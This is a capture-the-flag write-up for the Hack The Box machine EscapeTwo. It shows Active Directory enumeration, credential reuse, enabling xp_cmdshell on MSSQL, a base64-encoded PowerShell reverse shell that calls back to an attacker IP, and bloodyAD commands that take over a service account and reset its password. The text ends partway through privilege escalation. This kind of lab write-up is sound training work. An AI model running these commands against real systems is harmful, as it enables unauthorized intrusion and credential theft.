# EscapeTwo Writeup - by Thammanant Thamtaranon  
- EscapeTwo is an easy Windows machine hosted on Hack The Box.

## Reconnaissance  
- I started with a full TCP port scan including service/version detection and OS fingerprinting:  
  `nmap -A -T4 -p- 10.10.11.51`  
![Nmap_Scan1](Nmap_Scan1.png)
![Nmap_Scan2](Nmap_Scan2.png) 
- The scan revealed a Windows Active Directory Domain Controller with multiple key services open, including:
  - 53/tcp (DNS): Domain Name Service
  - 88/tcp (Kerberos): Authentication protocol\
  - 135/tcp (MSRPC): Microsoft Remote Procedure Call
  - 139/445/tcp (SMB): File sharing and network communication
  - 389/636/tcp (LDAP/S): Lightweight Directory Access Protocol (and SSL)
  - 1433/tcp (MSSQL): Microsoft SQL Server <-- High Value Target
  - 5985/tcp (WinRM): Windows Remote Management
  
- I added `DC01.sequel.htb` and `sequel.htb` to `/etc/hosts` for proper hostname resolution.

## Scanning & Enumeration  
- We have been given the credential `rose / KxEPkKe6R8su`.
- We try connect to WinRM: `netexec winrm dc01.sequel.htb -u rose -p KxEPkKe6R8su`.
![WinRM](WinRM.png)
- We will try connect to MSSQL:  `impacket-mssqlclient -windows-auth sequel.htb/rose:KxEPkKe6R8su@dc01.sequel.htb`.
![MSSQL](MSSQL.png)
- Nothing useful there.
- We will then try use this with smb:  `smbclient -L //10.10.11.51 -U rose`
![SMB](SMB.png)
- In the `Accounting Department` share we found `accounting_2024.xlsx` and `accounts.xlsx`.
![Accounting](Accounting.png)
- I downloaded both file to my machine and try to read it, however weirdly both file is a ZIP file.
![ZIP](ZIP.png)
- So, we unzip and read it.
- In the file `/accounts_extracted/xl/sharedStrings.xml` contain credentials.
![Credentials](Credentials.png)
- Now we wil try connecting to smb again with the new founded credentials.
- Oscar's credentials work. However he does not have admin priviledge.
![Oscar1](Oscar1.png)
- We use these credentials to connect to WinRM, but sadly none works.
- We then use these credentials to connect to MSSQL.
- Oscar's credentials work. However he also does not have admin priviledge.
![Oscar2](Oscar2.png)
- The sa's credential work and it is a System Administrator account.
![SA](SA.png)
- We then try run `xp_cmdshell whoami` but failed, However as we are the system administrator we can enable it with `enable_xp_cmdshell`.
![Shell](Shell.png)

## Exploitation  
- We change the command to a revershell copied from `https://www.revshells.com/`:  `xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=`
![SVC](SVC.png)
- We run the command `net users` and discover other users.
![Users](Users.png)
- In the file system root we found `SQL2019`, inside we found `sql-Configuration.INI` which is a configuration file.
![Config](Config.png)
- Inside we found `sql_svc` password, so we will try this password.
![Ryan](Ryan.png)
- We then use evil-winrm:  `evil-winrm -i dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3`.
- We got a shell as user ryan and capture the user flag.

## Privilege Escalation  
- We then run bloodhound:  `netexec ldap dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.10.11.51` and import the zip extension to `bloodhound-cli`.
- After inspect the nodes and relationship, we founded that user `ryan` has `WriteOwner` over `CA_SVC`.
![WriteOwner](WriteOwner.png)
- We then set the ryan as the owner using bloodyAD: `bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan`
- Then we grants ryan `GenericAll` rights on CA_SVC:  `bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan`
![Owner](Owner.png)
- We will also change the password of CA_SVA: `bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set password ca_svc password`
- 
